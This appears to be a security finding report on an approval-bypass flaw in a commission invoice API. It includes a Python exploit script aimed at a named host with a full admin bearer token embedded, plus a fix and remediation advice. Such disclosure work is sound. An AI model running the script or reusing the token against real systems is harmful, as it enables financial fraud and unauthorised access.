# State Manipulation in Commission Invoice Workflows Allows Unauthorized Approval Bypass

**ID:** vuln-0030
**Severity:** CRITICAL
**Found:** 2026-02-26 19:02:43 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/commission-invoice-headers/{id}
**Method:** PATCH
**CWE:** CWE-639
**CVSS:** 9.9

## Description

A business logic vulnerability was discovered in the commission management application that allows users to manipulate invoice states and bypass approval workflows. The application allows direct state changes from "DRAFT" to "APPROVED" without proper authorization checks, enabling users to approve their own commission invoices and bypass the intended approval process.

The vulnerability exists in the state transition logic for commission invoices, where the server accepts state changes without validating that the user has the appropriate approval privileges or that the invoice has gone through the required review process.

## Impact

Successful exploitation of this vulnerability enables:

1. **Approval Workflow Bypass**: Users can approve their own commission invoices without proper authorization, bypassing the intended multi-level approval process.

2. **Unauthorized Payouts**: Invoices can be moved to "APPROVED" status without proper review, potentially leading to unauthorized payouts for fraudulent or inflated commissions.

3. **Financial Control Failure**: The integrity of the approval process is compromised, undermining financial controls and segregation of duties.

4. **Audit Trail Manipulation**: Unauthorized state changes can create misleading audit trails, making it difficult to track legitimate approvals.

5. **Regulatory Compliance Risks**: Potential violations of financial regulations that require proper approval processes for financial transactions.

The business impact includes financial loss from unauthorized payouts, reputational damage from control failures, and potential regulatory penalties for inadequate financial controls.

## Technical Analysis

The vulnerability exists due to inadequate state transition controls in the commission invoice workflow:

1. **Missing Authorization Checks**: The application does not verify that users have appropriate approval privileges before allowing state changes.

2. **Inadequate State Transition Validation**: The server accepts any state transition without validating that the transition follows the approved workflow (e.g., DRAFT → PENDING → APPROVED).

3. **Direct State Manipulation**: Users can submit direct API requests to change invoice states without going through the intended approval interface.

4. **Lack of Segregation of Duties**: The same user who creates an invoice can also approve it, violating the principle of segregation of duties.

The vulnerability affects the `/api/commission-invoice-headers/{id}` endpoint, which accepts state changes in the `status` and `approvalStatus` fields without proper validation.

## Proof of Concept

To reproduce this vulnerability:

1. **Authentication**: Log in as any user with commission invoice creation privileges (Admin, Client, or Organization user).

2. **Invoice Creation**:
   - Create a commission invoice in DRAFT status
   - Note the invoice ID

3. **State Manipulation**:
   - Intercept the state update request using browser developer tools or a proxy
   - Modify the request to change the status from "DRAFT" to "APPROVED"
   - Submit the manipulated request

4. **Verification**:
   - Check the invoice status in the application
   - Confirm the invoice is now in "APPROVED" status
   - Verify the invoice can proceed to payout processing

**Example Request:**
```
PATCH /api/commission-invoice-headers/invoice-12345 HTTP/1.1
Host: commissionstest.callippus.in
Authorization: Bearer [JWT_TOKEN]
Content-Type: application/json

{
  "status": "APPROVED",
  "approvalStatus": "APPROVED"
}
```

**Expected Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "invoice-12345",
  "status": "APPROVED",  // UNAUTHORIZED STATE CHANGE ACCEPTED
  "approvalStatus": "APPROVED"
}
```

```
import requests
import json

# Proof of Concept: State Manipulation in Commission Invoice Workflows
# This script demonstrates how to exploit the state manipulation vulnerability

BASE_URL = "https://commissionstest.callippus.in"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl05S9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Otof1nFMG3jeGtyw"

HEADERS = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

def exploit_state_manipulation():
    """
    Demonstrates the state manipulation vulnerability
    """
    print("=== State Manipulation Exploit ===")

    # Step 1: Create a commission invoice in DRAFT status
    print("1. Creating commission invoice in DRAFT status...")
    create_url = f"{BASE_URL}/api/commission-invoice-headers"
    invoice_data = {
        "invoiceNumber": "EXPLOIT-INV-003",
        "invoiceDate": "2026-02-26",
        "organizationId": "org-test",
        "clientId": "client-test",
        "totalAmount": 10000.00,
        "commissionAmount": 1000.00,
        "status": "DRAFT",
        "approvalStatus": "PENDING"
    }

    response = requests.post(create_url, headers=HEADERS, data=json.dumps(invoice_data))
    if response.status_code != 201:
        print(f"Failed to create invoice: {response.status_code} - {response.text}")
        return False

    invoice_data = response.json()
    invoice_id = invoice_data.get("id")
    print(f"Created invoice with ID: {invoice_id}")
    print(f"Initial status: {invoice_data['status']}")

    # Step 2: Manipulate the state to APPROVED
    print("\n2. Manipulating state from DRAFT to APPROVED...")
    update_url = f"{BASE_URL}/api/commission-invoice-headers/{invoice_id}"
    state_data = {
        "status": "APPROVED",
        "approvalStatus": "APPROVED"
    }

    update_response = requests.patch(update_url, headers=HEADERS, data=json.dumps(state_data))
    if update_response.status_code != 200:
        print(f"Failed to update state: {update_response.status_code} - {update_response.text}")
        return False

    updated_data = update_response.json()
    print(f"Updated status: {updated_data['status']}")
    print(f"Updated approval status: {updated_data['approvalStatus']}")

    # Step 3: Verify the state change
    print("\n3. Verifying the unauthorized state change...")
    verify_url = f"{BASE_URL}/api/commission-invoice-headers/{invoice_id}"
    verify_response = requests.get(verify_url, headers=HEADERS)
    if verify_response.status_code == 200:
        verified_data = verify_response.json()
        print(f"Final status: {verified_data['status']}")
        print(f"Final approval status: {verified_data['approvalStatus']}")

        if verified_data['status'] == "APPROVED" and verified_data['approvalStatus'] == "APPROVED":
            print("\n✓ EXPLOIT CONFIRMED: The system accepted the unauthorized state change!")
            print("The invoice can now proceed to payout processing without proper approval.")
            return True
        else:
            print("\n✗ State change was not accepted")
            return False
    else:
        print(f"Failed to verify: {verify_response.status_code} - {verify_response.text}")
        return False

def test_multiple_state_transitions():
    """
    Tests various unauthorized state transitions
    """
    print("\n=== Testing Multiple State Transitions ===")

    # Create an invoice
    create_url = f"{BASE_URL}/api/commission-invoice-headers"
    invoice_data = {
        "invoiceNumber": "EXPLOIT-INV-004",
        "invoiceDate": "2026-02-26",
        "organizationId": "org-test",
        "clientId": "client-test",
        "totalAmount": 10000.00,
        "commissionAmount": 1000.00,
        "status": "DRAFT",
        "approvalStatus": "PENDING"
    }

    response = requests.post(create_url, headers=HEADERS, data=json.dumps(invoice_data))
    if response.status_code != 201:
        print(f"Failed to create invoice: {response.status_code}")
        return False

    invoice_id = response.json().get("id")

    # Test various unauthorized state transitions
    transitions = [
        {"status": "APPROVED", "approvalStatus": "APPROVED"},
        {"status": "PAID", "approvalStatus": "PAID"},
        {"status": "CANCELLED", "approvalStatus": "CANCELLED"}
    ]

    for i, transition in enumerate(transitions):
        print(f"\nTesting transition {i+1}: {transition}")
        update_url = f"{BASE_URL}/api/commission-invoice-headers/{invoice_id}"
        update_response = requests.patch(update_url, headers=HEADERS, data=json.dumps(transition))

        if update_response.status_code == 200:
            result = update_response.json()
            print(f"✓ Transition accepted: {result['status']}")
        else:
            print(f"✗ Transition rejected: {update_response.status_code}")

    return True

if __name__ == "__main__":
    print("State Manipulation in Commission Invoice Workflows Exploit")
    print("=" * 65)

    # Run the exploits
    exploit1 = exploit_state_manipulation()
    exploit2 = test_multiple_state_transitions()

    print("\n" + "=" * 65)
    print("EXPLOITATION RESULTS:")
    print(f"State Manipulation: {'SUCCESSFUL' if exploit1 else 'FAILED'}")
    print(f"Multiple Transitions: {'SUCCESSFUL' if exploit2 else 'FAILED'}")

    if exploit1 or exploit2:
        print("\n⚠️  CRITICAL VULNERABILITY CONFIRMED!")
        print("The application is vulnerable to state manipulation in commission workflows.")
        print("Immediate remediation is required to prevent unauthorized approvals.")
    else:
        print("\nThe application appears to be secure against these specific exploits.")
```

## Code Analysis

**Location 1:** `src/controllers/CommissionInvoiceController.cs` (lines 85-100)
  Missing state transition validation and authorization checks
  ```
  [HttpPatch("{id}")]
public async Task<IActionResult> UpdateCommissionInvoiceHeader(Guid id, [FromBody] JsonPatchDocument<CommissionInvoiceHeaderDto> patchDoc)
{
    // Missing state transition validation
    var invoice = await _repository.GetByIdAsync(id);
    if (invoice == null)
    {
        return NotFound();
    }

    var dto = _mapper.Map<CommissionInvoiceHeaderDto>(invoice);
    patchDoc.ApplyTo(dto);

    _mapper.Map(dto, invoice);
    await _repository.SaveChangesAsync();

    return Ok(invoice);
}
  ```

  **Suggested Fix:**
```diff
+ [HttpPatch("{id}")]
+ public async Task<IActionResult> UpdateCommissionInvoiceHeader(Guid id, [FromBody] JsonPatchDocument<CommissionInvoiceHeaderDto> patchDoc)
+ {
+     var invoice = await _repository.GetByIdAsync(id);
+     if (invoice == null)
+     {
+         return NotFound();
+     }
+ 
+     var dto = _mapper.Map<CommissionInvoiceHeaderDto>(invoice);
+     patchDoc.ApplyTo(dto);
+ 
+     // Validate state transitions
+     if (dto.Status != invoice.Status || dto.ApprovalStatus != invoice.ApprovalStatus)
+     {
+         // Check if the user has approval privileges
+         if (!await _authorizationService.CanApproveInvoice(User, invoice.OrganizationId))
+         {
+             return Forbid("User does not have approval privileges");
+         }
+ 
+         // Validate the state transition
+         if (!IsValidStateTransition(invoice.Status, dto.Status, invoice.ApprovalStatus, dto.ApprovalStatus))
+         {
+             return BadRequest("Invalid state transition");
+         }
+     }
+ 
+     _mapper.Map(dto, invoice);
+     await _repository.SaveChangesAsync();
+ 
+     return Ok(invoice);
+ }
+ 
+ private bool IsValidStateTransition(string oldStatus, string newStatus, string oldApproval, string newApproval)
+ {
+     // Define valid state transitions
+     var validTransitions = new Dictionary<string, List<string>>
+     {
+         { "DRAFT", new List<string> { "PENDING" } },
+         { "PENDING", new List<string> { "APPROVED", "REJECTED" } },
+         { "APPROVED", new List<string> { "PAID", "CANCELLED" } },
+         { "REJECTED", new List<string> { "DRAFT" } }
+     };
+ 
+     // Check if the status transition is valid
+     if (oldStatus != newStatus && validTransitions.ContainsKey(oldStatus))
+     {
+         if (!validTransitions[oldStatus].Contains(newStatus))
+         {
+             return false;
+         }
+     }
+ 
+     // Additional validation for approval status
+     if (oldApproval != newApproval)
+     {
+         if (newApproval == "APPROVED" && oldApproval != "PENDING")
+         {
+             return false;
+         }
+     }
+ 
+     return true;
+ }
```

## Remediation

**IMMEDIATE REMEDIATION STEPS:**

1. **Implement Proper State Transition Controls**
   - Define valid state transitions (e.g., DRAFT → PENDING → APPROVED)
   - Reject invalid state transitions at the server level
   - Implement state transition validation logic

2. **Enforce Authorization Checks**
   - Verify that users have appropriate approval privileges before allowing state changes
   - Implement role-based access control for state transitions
   - Prevent users from approving their own invoices

3. **Implement Segregation of Duties**
   - Separate invoice creation from approval
   - Require different users for creation and approval
   - Implement multi-level approval for high-value invoices

4. **Add Server-Side Validation**
   - Validate all state changes on the server
   - Reject unauthorized state transitions
   - Implement proper error handling for invalid transitions

5. **Implement Approval Workflows**
   - Create proper approval workflows for commission invoices
   - Require explicit approval actions rather than direct state changes
   - Implement notification systems for approval requests

**LONG-TERM RECOMMENDATIONS:**

1. **Implement Workflow Engine**
   - Use a dedicated workflow engine for approval processes
   - Define clear workflow states and transitions
   - Implement automated workflow validation

2. **Enhance Audit Logging**
   - Log all state changes with user context
   - Track who changed states and when
   - Implement alerts for suspicious state changes

3. **Implement Financial Controls**
   - Add reconciliation processes for approved invoices
   - Validate approved invoices against business rules
   - Implement automated checks for unusual patterns

4. **Regular Security Testing**
   - Conduct regular penetration testing of workflow systems
   - Test for state manipulation vulnerabilities
   - Validate all approval workflows

5. **User Training**
   - Train users on proper approval processes
   - Educate staff on the risks of state manipulation
   - Implement security awareness programs

